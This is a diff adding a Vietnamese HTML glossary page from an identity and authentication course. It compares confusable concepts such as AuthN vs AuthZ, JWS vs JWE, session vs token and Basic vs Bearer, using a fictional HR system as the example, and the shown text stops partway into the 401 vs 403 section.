@@ -1,0 +1,653 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Phụ lục · Phân biệt khái niệm dễ nhầm</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<main class="content">
+
+<div class="page-head">
+  <div class="breadcrumb"><a href="index.html">Lộ trình</a> / <a href="appendix.html">Phụ lục</a> / I</div>
+  <h1>Phụ lục I — Phân biệt khái niệm dễ nhầm</h1>
+  <p class="lead">Những cặp thuật ngữ nghe giống nhau nhưng khác hẳn về bản chất, gom lại một chỗ để tra cứu nhanh. Mỗi khối có bảng so sánh ngắn, một ví dụ, một mẹo nhớ và link tới bài học đầy đủ.</p>
+  <div class="meta-row">
+    <span class="chip">⏱ tra cứu</span>
+    <span class="chip">📘 <a href="appendix.html">Phụ lục · Phụ lục</a></span>
+  </div>
+</div>
+
+<div class="callout info"><span class="callout-title">💡 Cách dùng trang này</span>
+<p>Đang đọc bài và gặp hai từ “na ná nhau”? Tìm ở mục lục bên dưới, đọc bảng và câu mẹo nhớ, rồi bấm “Học kỹ” để quay về bài gốc. Ví dụ dùng lại các hệ thống quen thuộc trong lộ trình: <b>Kaopiz HR</b> (<code>hr-web</code>, <code>hr-api</code>, <code>payroll-batch</code>, Keycloak realm <code>kaopiz</code>, nhân viên An) và <b>PrintNow / PhotoCloud</b> ở Module 03.</p>
+</div>
+
+<h2 id="muc-luc">Mục lục nhanh</h2>
+<div class="grid cols-2">
+<div class="card"><h4>1. Nền tảng</h4><ul>
+<li><a href="#authn-vs-authz">Identification vs Authentication vs Authorization</a></li>
+<li><a href="#identity-account-credential">Identity vs Account vs Credential</a></li>
+<li><a href="#idp-sp-rp-as-rs">IdP vs SP vs RP vs AS vs RS</a></li>
+<li><a href="#sso-vs-federation">SSO vs Federation</a></li>
+<li><a href="#mfa-vs-2sv">MFA vs 2SV</a></li>
+</ul></div>
+<div class="card"><h4>2. Mật mã</h4><ul>
+<li><a href="#encoding-encryption-hashing">Encoding vs Encryption vs Hashing vs Signature vs HMAC</a></li>
+<li><a href="#symmetric-vs-asymmetric">Symmetric vs Asymmetric</a></li>
+<li><a href="#hash-vs-password-hash">Hash thường vs Password hash (Salt, Pepper)</a></li>
+<li><a href="#tls-vs-mtls">TLS vs mTLS</a></li>
+</ul></div>
+<div class="card"><h4>3. Session &amp; token</h4><ul>
+<li><a href="#cookie-session-token">Cookie vs Session vs Token</a></li>
+<li><a href="#stateful-vs-stateless">Stateful vs Stateless</a></li>
+<li><a href="#access-id-refresh">Access vs ID vs Refresh token</a></li>
+<li><a href="#opaque-vs-jwt">Opaque token vs JWT</a></li>
+<li><a href="#jws-vs-jwe">JWS vs JWE</a></li>
+<li><a href="#decode-vs-verify">Decode vs Verify (JWT)</a></li>
+<li><a href="#introspection-vs-revocation">Introspection vs Revocation</a></li>
+<li><a href="#basic-bearer-apikey">Basic vs Bearer vs API key</a></li>
+<li><a href="#401-vs-403">401 vs 403</a></li>
+</ul></div>
+<div class="card"><h4>4. OAuth / OIDC</h4><ul>
+<li><a href="#oauth-vs-oidc">OAuth 2.0 vs OpenID Connect</a></li>
+<li><a href="#public-vs-confidential">Public vs Confidential client</a></li>
+<li><a href="#front-vs-back-channel">Front-channel vs Back-channel (code vs access token)</a></li>
+<li><a href="#state-nonce-pkce">state vs nonce vs PKCE</a></li>
+<li><a href="#grant-types">Authorization Code vs Client Credentials vs Device flow</a></li>
+<li><a href="#scope-claim-role">Scope vs Claim vs Role</a></li>
+</ul></div>
+<div class="card"><h4>5. SAML &amp; enterprise</h4><ul>
+<li><a href="#oidc-vs-saml">OIDC vs SAML</a></li>
+<li><a href="#response-vs-assertion">SAML Response vs SAML Assertion vs WebAuthn assertion</a></li>
+<li><a href="#sp-vs-idp-initiated">SP-initiated vs IdP-initiated</a></li>
+<li><a href="#ldap-ad-entra">LDAP vs AD vs Entra ID</a></li>
+<li><a href="#kerberos-vs-ntlm">Kerberos vs NTLM</a></li>
+</ul></div>
+<div class="card"><h4>6. Passwordless &amp; bảo mật</h4><ul>
+<li><a href="#fido2-webauthn-ctap-passkey">FIDO2 vs WebAuthn vs CTAP vs Passkey</a></li>
+<li><a href="#up-vs-uv">UP vs UV</a></li>
+<li><a href="#synced-vs-device-bound">Synced vs Device-bound passkey</a></li>
+<li><a href="#rbac-abac-acl-rebac">RBAC vs ABAC vs ACL vs ReBAC</a></li>
+<li><a href="#csrf-vs-xss">CSRF vs XSS</a></li>
+<li><a href="#fixation-vs-hijacking">Session fixation vs Session hijacking</a></li>
+<li><a href="#phishing-aitm-fatigue">Phishing thường vs AiTM vs MFA fatigue</a></li>
+</ul></div>
+<div class="card"><h4>7. Kiến trúc</h4><ul>
+<li><a href="#spa-bff-server">SPA vs BFF vs Server-side web</a></li>
+<li><a href="#browser-vs-webview">System browser vs Embedded webview</a></li>
+<li><a href="#token-storage-compare">localStorage vs Memory vs HttpOnly cookie</a></li>
+</ul></div>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="nen-tang">1. Nền tảng</h2>
+
+<div class="compare" id="authn-vs-authz"><span class="compare-title">Identification vs Authentication vs Authorization</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Identification</th><th>Authentication (AuthN)</th><th>Authorization (AuthZ)</th></tr></thead>
+<tbody>
+<tr><td>Câu hỏi</td><td>“Bạn <b>xưng</b> là ai?”</td><td>“Có <b>đúng</b> là bạn không?”</td><td>“Bạn <b>được làm gì</b>?”</td></tr>
+<tr><td>Đầu vào</td><td>Username, email, số thẻ</td><td>Mật khẩu, OTP, passkey…</td><td>Role, scope, thuộc tính, policy</td></tr>
+<tr><td>Thứ tự</td><td>Trước tiên</td><td>Sau identification</td><td>Sau khi đã xác thực</td></tr>
+<tr><td>Lỗi HTTP khi thất bại</td><td>—</td><td><code>401 Unauthorized</code></td><td><code>403 Forbidden</code></td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An gõ <code>an@kaopiz.com</code> (identification), nhập mật khẩu + duyệt push (authentication). Vào được <code>hr-web</code> nhưng bấm “Duyệt lương” bị chặn vì An không có role <code>payroll-admin</code> (authorization).</p>
+<span class="rule">Xưng tên → chứng minh → xin phép. Đăng nhập thành công không có nghĩa là được làm mọi thứ.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m01-1-identity-roles.html#iaaa">Bài 1.1 — Identification, Authentication, Authorization, Accounting</a></p>
+</div>
+
+<div class="compare" id="identity-account-credential"><span class="compare-title">Identity vs Account vs Credential</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Identity</th><th>Account</th><th>Credential</th></tr></thead>
+<tbody>
+<tr><td>Là gì</td><td>Danh tính: “một người/máy cụ thể” cùng các thuộc tính</td><td>Bản ghi của danh tính <b>trong một hệ thống</b></td><td>Thứ dùng để <b>chứng minh</b> mình là chủ account</td></tr>
+<tr><td>Số lượng</td><td>Một người = một identity</td><td>Một người có thể có nhiều account</td><td>Một account có thể có nhiều credential</td></tr>
+<tr><td>Ví dụ</td><td>Nhân viên Nguyễn Văn An</td><td>Account Entra ID, GitHub, <code>user_id = 57</code> trong app HR</td><td>Mật khẩu, passkey, client secret, certificate</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An nghỉ việc: khóa <b>account</b> trong Keycloak realm <code>kaopiz</code> là đủ chặn đăng nhập; đổi <b>credential</b> (mật khẩu) thì không — session/refresh token cũ có thể vẫn còn.</p>
+<span class="rule">Identity là “người”, account là “hồ sơ của người ở một nơi”, credential là “chìa khóa mở hồ sơ”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m01-1-identity-roles.html#identity-account">Bài 1.1 — Identity, Account, Credential</a></p>
+</div>
+
+<div class="compare" id="idp-sp-rp-as-rs"><span class="compare-title">IdP vs SP vs RP vs AS vs RS</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Vai trò</th><th>Làm gì</th><th>Dùng trong</th><th>Ví dụ</th></tr></thead>
+<tbody>
+<tr><td><b>IdP</b> (Identity Provider)</td><td>Xác thực người dùng, phát “giấy chứng nhận” danh tính</td><td>SAML, OIDC (nói chung)</td><td>Keycloak, Entra ID</td></tr>
+<tr><td><b>SP</b> (Service Provider)</td><td>Ứng dụng nhận assertion từ IdP</td><td>SAML</td><td><code>hr-web</code> dùng SAML</td></tr>
+<tr><td><b>RP</b> (Relying Party)</td><td>Ứng dụng “dựa vào” IdP để biết người dùng là ai</td><td>OIDC (và WebAuthn)</td><td><code>hr-web</code> dùng OIDC</td></tr>
+<tr><td><b>AS</b> (Authorization Server)</td><td>Phát access token cho client</td><td>OAuth</td><td>Keycloak realm <code>kaopiz</code></td></tr>
+<tr><td><b>RS</b> (Resource Server)</td><td>API nhận và kiểm tra access token</td><td>OAuth</td><td><code>hr-api</code></td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Cùng một Keycloak vừa là <b>IdP/OpenID Provider</b> (cấp ID token cho <code>hr-web</code>) vừa là <b>AS</b> (cấp access token để gọi <code>hr-api</code>). SP và RP là cùng một ý — chỉ khác tên theo giao thức.</p>
+<span class="rule">IdP/AS “phát giấy”; SP/RP “đọc giấy để cho người vào”; RS “đọc vé để cho gọi API”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m01-1-identity-roles.html#vai-tro">Bài 1.1 — Các thuật ngữ và vai trò</a></p>
+</div>
+
+<div class="compare" id="sso-vs-federation"><span class="compare-title">SSO vs Federation</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>SSO</th><th>Federation</th></tr></thead>
+<tbody>
+<tr><td>Là gì</td><td><b>Trải nghiệm</b>: đăng nhập một lần, vào nhiều app</td><td><b>Quan hệ tin cậy</b> giữa các miền: miền này tin danh tính do miền kia phát</td></tr>
+<tr><td>Phạm vi</td><td>Có thể chỉ trong một tổ chức</td><td>Thường giữa các tổ chức/miền khác nhau</td></tr>
+<tr><td>Cần cái kia?</td><td>Không bắt buộc (SSO nội bộ bằng Kerberos)</td><td>Không bắt buộc tạo ra SSO, nhưng thường dùng để có SSO</td></tr>
+<tr><td>Công nghệ</td><td>Kerberos, session ở IdP, OIDC, SAML</td><td>SAML, OIDC, WS-Federation (trao đổi metadata, khóa)</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An mở <code>hr-web</code> rồi sang wiki công ty mà không phải gõ lại mật khẩu → SSO. Đối tác đăng nhập vào cổng của Kaopiz bằng tài khoản Entra ID của chính công ty họ → federation.</p>
+<span class="rule">SSO là cảm giác của người dùng; federation là hợp đồng tin cậy giữa các hệ thống.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m01-2-sso-federation-mfa.html#sso-federation-mfa">Bài 1.2 — SSO, Federation, MFA</a></p>
+</div>
+
+<div class="compare" id="mfa-vs-2sv"><span class="compare-title">MFA vs 2SV (two-step verification)</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>MFA</th><th>2SV</th></tr></thead>
+<tbody>
+<tr><td>Định nghĩa</td><td>Ít nhất 2 yếu tố thuộc <b>nhóm khác nhau</b>: biết / có / là</td><td>Hai <b>bước</b> kiểm tra, không bắt buộc khác nhóm</td></tr>
+<tr><td>Ví dụ</td><td>Mật khẩu (biết) + passkey trên điện thoại (có)</td><td>Mật khẩu + câu hỏi bí mật (cả hai đều là “biết”)</td></tr>
+<tr><td>Độ mạnh</td><td>Mạnh hơn: lộ một yếu tố chưa đủ</td><td>Tùy: nếu cả hai bước cùng nhóm, một vụ lộ dữ liệu có thể làm mất cả hai</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Kẻ tấn công đọc được bảng câu hỏi bí mật và mật khẩu từ cùng một lần rò rỉ → vượt 2SV kiểu “biết + biết”. Với MFA “mật khẩu + khóa FIDO2”, hắn vẫn phải lấy được thiết bị.</p>
+<span class="rule">MFA đếm <b>loại</b> yếu tố, 2SV chỉ đếm <b>số bước</b>.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m01-2-sso-federation-mfa.html#mfa">Bài 1.2 — MFA</a> và <a href="m01-2-sso-federation-mfa.html#factors">Authentication factors</a></p>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="mat-ma">2. Mật mã</h2>
+
+<div class="compare" id="encoding-encryption-hashing"><span class="compare-title">Encoding vs Encryption vs Hashing vs Signature vs HMAC</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Kỹ thuật</th><th>Mục đích</th><th>Cần khóa?</th><th>Đảo ngược?</th><th>Ví dụ</th></tr></thead>
+<tbody>
+<tr><td><b>Encoding</b></td><td>Đổi định dạng để truyền được</td><td>Không</td><td>Có, ai cũng làm được</td><td>Base64URL trong JWT</td></tr>
+<tr><td><b>Encryption</b></td><td>Giữ <b>bí mật</b> nội dung</td><td>Có</td><td>Có, nếu có khóa</td><td>AES-GCM, TLS, JWE</td></tr>
+<tr><td><b>Hashing</b></td><td>“Dấu vân tay” cố định, phát hiện thay đổi</td><td>Không</td><td>Không (một chiều)</td><td>SHA-256</td></tr>
+<tr><td><b>Signature</b></td><td>Chứng minh <b>ai</b> tạo + không bị sửa</td><td>Private key ký, public key kiểm</td><td>Không (dùng để kiểm)</td><td>RS256, ES256</td></tr>
+<tr><td><b>HMAC</b></td><td>Chống sửa giữa hai bên <b>cùng giữ</b> một bí mật</td><td>Một secret dùng chung</td><td>Không</td><td>HS256, ký webhook</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Phần payload của JWT chỉ được <b>encode</b> Base64URL — ai copy token vào jwt.io cũng đọc được. Thứ bảo vệ token là <b>chữ ký</b>, không phải “mã hóa”.</p>
+<span class="rule">Encoding không bảo mật gì; encryption giấu nội dung; hash/HMAC/signature chống sửa (signature còn chứng minh được ai ký).</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-1-crypto.html#hash-vs-encryption">Bài 2.1 — Những phân biệt quan trọng</a></p>
+</div>
+
+<div class="compare" id="symmetric-vs-asymmetric"><span class="compare-title">Symmetric vs Asymmetric</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Symmetric (đối xứng)</th><th>Asymmetric (bất đối xứng)</th></tr></thead>
+<tbody>
+<tr><td>Khóa</td><td>Một khóa chung cho cả hai bên</td><td>Cặp khóa: private (giữ kín) + public (công khai)</td></tr>
+<tr><td>Tốc độ</td><td>Nhanh</td><td>Chậm hơn nhiều</td></tr>
+<tr><td>Khó khăn</td><td>Phải chia sẻ khóa an toàn</td><td>Phải tin public key đúng là của ai (cần certificate/JWKS)</td></tr>
+<tr><td>Ví dụ trong auth</td><td>AES, HS256 (HMAC)</td><td>RSA, ECDSA: RS256, ES256, chữ ký passkey</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Keycloak ký access token bằng RS256: chỉ Keycloak giữ private key, còn <code>hr-api</code> và mọi API khác tải public key từ JWKS để kiểm. Nếu dùng HS256, mọi API phải giữ cùng secret — và API nào cũng có thể giả token.</p>
+<span class="rule">Đối xứng = một chìa cho mọi người; bất đối xứng = ổ khóa công khai, chìa riêng chỉ một người giữ.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-1-crypto.html#symmetric-asymmetric">Bài 2.1 — Symmetric vs Asymmetric</a></p>
+</div>
+
+<div class="compare" id="hash-vs-password-hash"><span class="compare-title">Hash thường vs Password hash (và Salt vs Pepper)</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Hash thường (SHA-256)</th><th>Password hash (Argon2id, bcrypt, PBKDF2)</th></tr></thead>
+<tbody>
+<tr><td>Thiết kế để</td><td><b>Nhanh</b> (checksum, chữ ký)</td><td><b>Chậm có chủ đích</b>, tốn RAM/CPU, chỉnh được</td></tr>
+<tr><td>Brute-force mật khẩu</td><td>GPU thử hàng tỷ lần/giây</td><td>Mỗi lần thử tốn nhiều ms → rất đắt</td></tr>
+<tr><td>Salt</td><td>Không có sẵn</td><td>Salt ngẫu nhiên riêng cho từng user, lưu <b>cùng</b> hash trong DB</td></tr>
+<tr><td>Pepper</td><td>—</td><td>(Tùy chọn) một bí mật chung, lưu <b>ngoài DB</b> (key vault/HSM)</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Hai nhân viên cùng đặt mật khẩu <code>Kaopiz2026</code>. Với SHA-256 không salt, hai hash giống hệt nhau và tra được trong rainbow table. Với Argon2id + salt riêng, hai hash khác nhau và mỗi lần đoán đều tốn chi phí. Nếu có pepper, kẻ trộm chỉ lấy được DB vẫn thiếu một mảnh để đoán.</p>
+<span class="rule">Mật khẩu thì dùng hash <b>chậm</b>. Salt không bí mật nhưng phải riêng từng user; pepper là bí mật chung, để ngoài DB.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-1-crypto.html#password-hashing">Bài 2.1 — Password hashing và Salt</a></p>
+</div>
+
+<div class="compare" id="tls-vs-mtls"><span class="compare-title">TLS vs mTLS</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>TLS (HTTPS thường)</th><th>mTLS (mutual TLS)</th></tr></thead>
+<tbody>
+<tr><td>Ai trình certificate</td><td>Chỉ <b>server</b></td><td><b>Cả server lẫn client</b></td></tr>
+<tr><td>Client được xác thực?</td><td>Không, ở tầng TLS (phải dùng mật khẩu/token ở tầng trên)</td><td>Có, bằng client certificate</td></tr>
+<tr><td>Dùng khi</td><td>Mọi website, API công khai</td><td>Service-to-service, thiết bị, client OAuth độ tin cậy cao</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Trình duyệt của An mở <code>https://hr.kaopiz.com</code> → TLS: trình duyệt kiểm cert của server. <code>payroll-batch</code> gọi <code>hr-api</code> qua mTLS → <code>hr-api</code> cũng kiểm cert của <code>payroll-batch</code> trước khi nhận kết nối.</p>
+<span class="rule">TLS: “tôi kiểm anh”. mTLS: “hai bên kiểm nhau”.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-1-crypto.html#tls">Bài 2.1 — TLS/HTTPS và mTLS</a></p>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="session-token">3. Session &amp; token</h2>
+
+<div class="compare" id="cookie-session-token"><span class="compare-title">Cookie vs Session vs Token</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Cookie</th><th>Session</th><th>Token</th></tr></thead>
+<tbody>
+<tr><td>Bản chất</td><td><b>Cơ chế lưu/gửi</b> dữ liệu nhỏ của trình duyệt</td><td><b>Trạng thái đăng nhập</b> lưu ở server</td><td><b>Chuỗi tự mang thông tin</b> (hoặc tham chiếu) chứng minh quyền</td></tr>
+<tr><td>Nằm ở đâu</td><td>Trình duyệt, tự gửi kèm mọi request cùng site</td><td>RAM/Redis/DB của server</td><td>Bất kỳ đâu client giữ; gửi trong header <code>Authorization</code></td></tr>
+<tr><td>Thường chứa</td><td>Session ID, hoặc chính token</td><td>User ID, thời điểm đăng nhập…</td><td>Claims: <code>sub</code>, <code>aud</code>, <code>exp</code>, scope…</td></tr>
+<tr><td>Thu hồi</td><td>—</td><td>Xóa ở server là xong</td><td>Khó hơn nếu là JWT (sống tới <code>exp</code>)</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> <code>hr-web</code> giữ session của An trên server; trình duyệt chỉ có cookie <code>.AspNetCore.Cookies</code> (chứa tham chiếu tới session). Khi <code>hr-web</code> gọi <code>hr-api</code>, nó gửi <b>access token</b> chứ không gửi cookie.</p>
+<span class="rule">Cookie là “cái túi”, session là “hồ sơ ở quầy”, token là “tấm vé mang theo người”. Túi có thể đựng số hồ sơ hoặc đựng vé.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-2-session-cookie.html#cookie-vs-session">Bài 2.2 — Cookie ≠ Session</a></p>
+</div>
+
+<div class="compare" id="stateful-vs-stateless"><span class="compare-title">Stateful vs Stateless</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Stateful</th><th>Stateless</th></tr></thead>
+<tbody>
+<tr><td>Server có nhớ phiên?</td><td>Có, tra session store mỗi request</td><td>Không, mọi thông tin nằm trong token tự kiểm được</td></tr>
+<tr><td>Scale nhiều server</td><td>Cần store dùng chung (Redis) hoặc sticky session</td><td>Dễ: server nào cũng kiểm được chữ ký</td></tr>
+<tr><td>Thu hồi tức thì</td><td>Dễ: xóa session</td><td>Khó: phải chờ token hết hạn hoặc thêm denylist</td></tr>
+<tr><td>Ví dụ</td><td>Cookie session của <code>hr-web</code></td><td><code>hr-api</code> kiểm JWT bằng JWKS</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Admin khóa account An lúc 10:00. <code>hr-web</code> (stateful) xóa session → An bị đẩy ra ngay. <code>hr-api</code> (stateless) vẫn chấp nhận access token còn hạn tới 10:05 — vì vậy access token nên sống ngắn.</p>
+<span class="rule">Stateful dễ thu hồi, khó scale; stateless dễ scale, khó thu hồi.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-2-session-cookie.html#stateful-stateless">Bài 2.2 — Stateful vs Stateless</a></p>
+</div>
+
+<div class="compare" id="access-id-refresh"><span class="compare-title">Access token vs ID token vs Refresh token</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Access token</th><th>ID token</th><th>Refresh token</th></tr></thead>
+<tbody>
+<tr><td>Dành cho ai</td><td><b>API</b> (resource server)</td><td><b>Client</b> (RP)</td><td><b>Authorization server</b></td></tr>
+<tr><td>Để làm gì</td><td>Gọi API</td><td>Cho client biết ai vừa đăng nhập</td><td>Xin access token mới khi cũ hết hạn</td></tr>
+<tr><td>Đến từ</td><td>OAuth 2.0</td><td>OIDC (luôn là JWT)</td><td>OAuth 2.0</td></tr>
+<tr><td>Sống bao lâu</td><td>Ngắn (vài phút)</td><td>Ngắn, chỉ dùng lúc đăng nhập</td><td>Dài hơn (giờ/ngày), nên rotate</td></tr>
+<tr><td>Gửi đi đâu</td><td><code>Authorization: Bearer</code> tới API</td><td>Không gửi tới API</td><td>Chỉ gửi tới token endpoint</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Sau khi An đăng nhập, <code>hr-web</code> đọc ID token để hiển thị “Xin chào An”, gửi access token (<code>aud</code> = <code>hr-api</code>) khi gọi API lương, và giữ refresh token để 5 phút sau lấy access token mới mà An không phải đăng nhập lại.</p>
+<span class="rule">ID token cho app biết “ai”; access token cho API biết “được gì”; refresh token chỉ nói chuyện với AS.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-3-token-jwt.html#token-compare">Bài 2.3 — Bảng so sánh Access / ID / Refresh token</a></p>
+</div>
+
+<div class="compare" id="opaque-vs-jwt"><span class="compare-title">Opaque token vs JWT</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Opaque token</th><th>JWT</th></tr></thead>
+<tbody>
+<tr><td>Nhìn vào thấy gì</td><td>Chuỗi ngẫu nhiên, không có nghĩa</td><td>Header.payload.signature, đọc được claims</td></tr>
+<tr><td>API kiểm thế nào</td><td>Hỏi AS qua <b>introspection</b> (hoặc tra DB)</td><td>Tự kiểm chữ ký + claims (cần JWKS)</td></tr>
+<tr><td>Thu hồi</td><td>Tức thì (AS trả <code>active: false</code>)</td><td>Phải chờ <code>exp</code> hoặc thêm cơ chế riêng</td></tr>
+<tr><td>Chi phí</td><td>Thêm một lượt gọi mạng mỗi request (có thể cache)</td><td>Không cần gọi AS mỗi request</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> <code>a9f3…c21</code> là opaque — <code>hr-api</code> phải POST tới <code>/introspect</code> để biết token còn sống không. <code>eyJhbGciOiJSUzI1NiJ9.eyJzdWIi…</code> là JWT — <code>hr-api</code> tự kiểm được.</p>
+<span class="rule">Opaque = “số phiếu”, phải hỏi quầy; JWT = “vé có dấu mộc”, tự kiểm tại cửa.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-3-token-jwt.html#opaque-vs-jwt">Bài 2.3 — Opaque token vs JWT</a></p>
+</div>
+
+<div class="compare" id="jws-vs-jwe"><span class="compare-title">JWS vs JWE</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>JWS (JSON Web Signature)</th><th>JWE (JSON Web Encryption)</th></tr></thead>
+<tbody>
+<tr><td>Bảo vệ</td><td><b>Toàn vẹn + nguồn gốc</b> (chữ ký)</td><td><b>Bí mật</b> nội dung (mã hóa)</td></tr>
+<tr><td>Payload đọc được?</td><td>Có, chỉ Base64URL</td><td>Không, nếu không có khóa giải mã</td></tr>
+<tr><td>Dạng compact</td><td>3 phần ngăn bởi dấu chấm</td><td>5 phần ngăn bởi dấu chấm</td></tr>
+<tr><td>Phổ biến</td><td>Hầu hết access/ID token</td><td>Ít gặp; khi token chứa dữ liệu nhạy cảm</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Access token Keycloak cấp cho <code>hr-api</code> là JWS (3 phần) — đừng nhét số CCCD hay lương vào claims, vì ai cầm token cũng đọc được.</p>
+<span class="rule">“JWT” hằng ngày gần như luôn là JWS: có dấu mộc nhưng không có phong bì.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-3-token-jwt.html#jws-jwe">Bài 2.3 — JWT, JWS và JWE</a></p>
+</div>
+
+<div class="compare" id="decode-vs-verify"><span class="compare-title">Decode vs Verify (JWT)</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Decode</th><th>Verify / Validate</th></tr></thead>
+<tbody>
+<tr><td>Làm gì</td><td>Base64URL-decode để đọc header, payload</td><td>Kiểm chữ ký bằng đúng key + kiểm <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>nbf</code>, <code>alg</code></td></tr>
+<tr><td>Cần key?</td><td>Không</td><td>Có (public key từ JWKS hoặc secret)</td></tr>
+<tr><td>Dùng để</td><td>Debug, xem nhanh</td><td>Quyết định có tin token hay không</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Một API chỉ gọi <code>JwtSecurityTokenHandler.ReadJwtToken()</code> rồi đọc <code>role</code> từ payload. Kẻ tấn công tự sửa payload thành <code>"role":"admin"</code>, encode lại → API tin ngay, vì nó mới chỉ <b>decode</b>, chưa <b>verify</b>.</p>
+<span class="rule">Đọc được không có nghĩa là tin được. Chưa verify thì mọi claim chỉ là lời tự khai.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-3-token-jwt.html#jwt-validation">Bài 2.3 — JWT validation checklist</a> và <a href="m06-4-identity-attacks.html#jwt-confusion">lỗi validation JWT</a></p>
+</div>
+
+<div class="compare" id="introspection-vs-revocation"><span class="compare-title">Token Introspection vs Token Revocation</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Introspection (RFC 7662)</th><th>Revocation (RFC 7009)</th></tr></thead>
+<tbody>
+<tr><td>Câu hỏi</td><td>“Token này còn sống không, của ai, scope gì?”</td><td>“Hãy hủy token này đi”</td></tr>
+<tr><td>Ai gọi</td><td>Thường là <b>resource server</b> (API)</td><td>Thường là <b>client</b> (khi logout)</td></tr>
+<tr><td>Kết quả</td><td>JSON <code>{"active": true, "sub": …, "scope": …}</code></td><td>HTTP 200, token không dùng được nữa</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> An bấm “Đăng xuất” → <code>hr-web</code> gọi <code>/revoke</code> với refresh token. Lần sau <code>hr-api</code> introspect một token liên quan sẽ nhận <code>{"active": false}</code> (với JWT tự kiểm thì API không biết, trừ khi nó introspect).</p>
+<span class="rule">Introspection là <b>hỏi</b>, revocation là <b>hủy</b>.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-4-token-lifecycle.html#introspection-revocation">Bài 2.4 — Introspection và Revocation</a></p>
+</div>
+
+<div class="compare" id="basic-bearer-apikey"><span class="compare-title">Basic vs Bearer vs API key</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>Basic</th><th>Bearer</th><th>API key</th></tr></thead>
+<tbody>
+<tr><td>Gửi gì</td><td><code>username:password</code> Base64 trong mỗi request</td><td>Access token do AS cấp</td><td>Chuỗi bí mật cố định</td></tr>
+<tr><td>Header</td><td><code>Authorization: Basic …</code></td><td><code>Authorization: Bearer …</code></td><td>Thường <code>X-Api-Key: …</code> (không chuẩn hóa)</td></tr>
+<tr><td>Hết hạn</td><td>Không (đến khi đổi mật khẩu)</td><td>Có, ngắn</td><td>Thường không, phải tự rotate</td></tr>
+<tr><td>Đại diện cho</td><td>User hoặc account kỹ thuật</td><td>User hoặc client, kèm scope</td><td>Thường là một ứng dụng/dự án</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> <code>payroll-batch</code> gọi <code>hr-api</code>: thay vì gắn cứng một API key vĩnh viễn, nó dùng Client Credentials để lấy access token 5 phút rồi gửi dạng Bearer. Nếu token lộ, thiệt hại chỉ kéo dài vài phút.</p>
+<span class="rule">“Bearer” = ai cầm cũng dùng được, nên phải sống ngắn và chỉ đi qua HTTPS. Basic và API key là bí mật dài hạn gửi đi liên tục.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m02-5-http-auth.html#auth-scheme-compare">Bài 2.5 — So sánh API key, Basic, Bearer và Client Credentials</a></p>
+</div>
+
+<div class="compare" id="401-vs-403"><span class="compare-title">401 Unauthorized vs 403 Forbidden</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>401</th><th>403</th></tr></thead>
+<tbody>
